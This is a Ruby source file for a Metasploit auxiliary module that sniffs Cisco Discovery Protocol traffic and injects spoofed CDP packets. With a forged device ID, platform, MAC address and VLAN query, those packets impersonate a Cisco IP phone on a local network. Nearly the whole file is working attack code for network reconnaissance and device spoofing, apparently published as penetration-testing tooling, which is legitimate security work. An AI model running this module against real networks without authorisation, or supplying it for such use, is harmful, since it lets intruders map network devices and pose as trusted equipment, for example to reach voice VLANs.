##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Capture

  def initialize
    super(
      'Name'				=> 'CDP Discovery and Spoofing',
      'Description' => 'This module captures and sends Cisco Discovery Protocol (CDP) packets for discovery',
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'License'     =>  MSF_LICENSE,
      'Actions'			=> [
        ['Sniff', { 'Description' => 'Sniffs CDP packets' }],
        ['Spoof', { 'Description' => 'Sends spoofed CDP packets' }]
      ],
      'PassiveActions' => %w(Sniff),
      'DefaultAction' => 'Sniff'
    )
    register_options(
      [
        OptString.new('SMAC', [false, "MAC Address for MAC Spoofing"]),
        OptString.new('VTPDOMAIN', [false, "VTP Domain"]),
        OptString.new('DEVICE_ID', [true, "Device ID (e.g. SIP00070EEA3156)", "SEP00070EEA3156"]),
        OptString.new('PORT', [true, "The CDP 'sent through interface' value", "Port 1"]),
        # XXX: this is not currently implemented
        # OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
        OptString.new('PLATFORM', [true, "Platform of the device", "Cisco IP Phone 7975"]),
        OptString.new('SOFTWARE', [true, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
        OptBool.new('FULL_DUPLEX', [true, 'True iff full-duplex, false otherwise', true])
      ], self.class)
    deregister_options('RHOST')
  end

  def setup
    check_pcaprub_loaded
    unless smac
      fail ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
    end
    open_pcap
    close_pcap
  end

  def interface
    @interface ||= datastore['INTERFACE'] || Pcap.lookupdev
  end

  def smac
    @smac ||= datastore['SMAC'] || get_mac(interface)
  end

  def run
    begin
      open_pcap

      case action.name
      when 'Spoof'
        do_spoof
      when 'Sniff'
        do_sniff
      else
        # this should never happen
        fail ArgumentError, "Invalid action #{action.name}"
      end
    ensure
      close_pcap
    end
  end

  def do_sniff
    print_status("Sniffing traffic on #{interface}")
    lbl = ["CDP Version\t", "Device Id\t", "IP Address\t",  "Switch Port\t",  "Capabilities",  "Software\t", "Platform\t",  nil, "Cluster Management",  "VTP Domain Management" , "Native VLAN\t", nil,  nil,  nil,  nil,  "VoIP VLAN Query"]
    each_packet do |pkt|
      p = PacketFu::Packet.parse(pkt)
      next unless p.proto != ["Eth", "LLDP"] && p.payload =~ /\x01\x00\x0C\xCC\xCC\xCC/
      pay = p.payload
      pos = 30
      cdp = pay[22].getbyte(0)
      report = "CDP Version\t\t: #{cdp}\n"
      if cdp == 2
        while true
          type = pay[pos - 4, 2].getbyte(1)
          break if pay[pos - 2, 2].nil?
          l = pay[pos - 2, 2].unpack('H*')[0].to_i(16)
          case type
          when 1
            d = pay[pos, l]
            d.chop! if d[-1] == "\n"
            report << "    #{lbl[type]} \t: #{d}\n"
          when 2
            if pay[pos, 4].unpack('H*')[0].to_i(16) == 1
              addr = pay[pos + 9, 4]
              ip = []
              4.times { |i| ip << "#{addr.getbyte(i)}" }
              report << "    #{lbl[type]}\t: #{ip.join(".")}\n"
            end
          when 3
            report << "    #{lbl[type]}\t: #{pay[pos,l]}\n"
          when 4
            c = pay[pos + 3, 1].getbyte(0)
            c = c.to_s(2)
            caps = ["Repeater\t\t", "IGMP Capable\t\t", "Host\t\t\t", "Switch\t\t", "Source Route Bridge\t", "Transparent Bridge\t", "Router\t\t"]
            report << "    #{lbl[type]}\t: \n"
            c.length.times do
              if c[-1].to_i == 1
                report << "\t\t\t  #{caps[-1]} : Yes\n"
              else
                report << "\t\t\t  #{caps[-1]} : No\n"
              end
              c.chop!
              caps.delete_at(-1)
            end
            unless caps.empty?
              caps.each do |missing_cap|
                report << "\t\t\t #{missing_cap}: No\n"
              end
            end
          when 5
            report << "    #{lbl[type]}\t: #{pay[pos, l].split("\n").join("\n\t\t\t  ")}\n"
          when 8
            # TODO?
            # report << "    #{lbl[type]}\t:\n"
            # report << "      IP: #{pay[pos+14,4]}\n"
          when 10
            report << "    #{lbl[type]}\t: #{pay[pos, 2].unpack('H*')[0].to_i(16)}\n"
          when 15
            report << "    #{lbl[type]}\t: #{pay[pos + 1, 2].unpack('H*')[0].to_i(16)}\n"
          else
            report << "    #{lbl[type]}\t: #{pay[pos, l]}\n" if lbl[type]
          end
          if pos > pay.length
            break
          else
            pos += l
          end
        end
      else
        report << "    TTL\t\t\t: #{pay[23].unpack('H*')[0].to_i(16)}"
      end
      print_good("#{report}")
    end
    print_status("Finished sniffing")
  end

  def do_spoof
    print_status("Sending CDP message on #{interface}")
    p = prep_cdp                                              # Preparation of the CDP content
    dst_mac = "\x01\x00\x0C\xCC\xCC\xCC"                      # CDP multicast

    # Source Mac Address Preparation
    src_mac = mac_to_bytes(smac)

    # Injecting packet to the network
    l = PacketFu::Inject.new(iface: interface)
    cdp_length = ["%04X" % (p.length + 8).to_s].pack('H*')
    dot3 = dst_mac + src_mac + cdp_length
    llc = "\xAA\xAA\x03\x00\x00\x0c\x20\x00"
    l.array_to_wire(array: [dot3 + llc + p])
  end

  def mac_to_bytes(mac)
    [mac.gsub(':', '')].pack('H*')
  end

  def prep_cdp
    # device ID
    p = tlv(1, datastore['DEVICE_ID'])
    # port ID
    p << tlv(3, datastore['PORT'])
    # TODO: implement this correctly
    # capabilities = datastore['CAPABILITIES'] || "Host"
    # CAPABILITIES
    # define CDP_CAP_LEVEL1          0x40
    # define CDP_CAP_FORWARD_IGMP    0x20
    # define CDP_CAP_NETWORK_LAYER   0x10
    # define CDP_CAP_LEVEL2_SWITCH   0x08
    # define CDP_CAP_LEVEL2_SRB      0x04
    # define CDP_CAP_LEVEL2_TRBR     0x02
    # define CDP_CAP_LEVEL3_ROUTER   0x01
    p << tlv(4, "\x00\x00\x00\x41")
    # software version
    p << tlv(5, datastore['SOFTWARE'])
    # platform
    p << tlv(6, datastore['PLATFORM'])
    # VTP management domain
    p << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']
    # random 1000-7000 power consumption in mW
    p << tlv(0x10, [1000 + rand(6000)].pack('n'))
    # duplex
    p << tlv(0x0b, datastore['FULL_DUPLEX'] ? "\x01" : "\x00")
    # VLAn query.  TOD: figure out this field, use tlv, make configurable
    p << "\x00\x0F\x00\b \x02\x00\x01"

    # VDP version
    version = "\x02"
    # TTL (180s)
    ttl = "\xB4"
    checksum = cdpchecksum(version + ttl + "\x00\x00" + p)
    version + ttl + checksum + p
  end

  def tlv(t, v)
    [ t, v.length + 4 ].pack("nn") + v
  end

  def cdpchecksum(p)
    num_shorts = p.length / 2
    cs = 0
    c = p.length

    p.unpack("S#{num_shorts}").each do |x|
      cs += x
      c -= 2
    end

    cs += p[p.length - 1].getbyte(0) << 8 if c == 1
    cs = (cs >> 16) + (cs & 0xffff)
    cs = ~((cs >> 16) + cs) & 0xffff
    cs = ([cs].pack("S*")).unpack("n*")[0]

    [ "%02X" % cs ].pack('H*')
  end
end
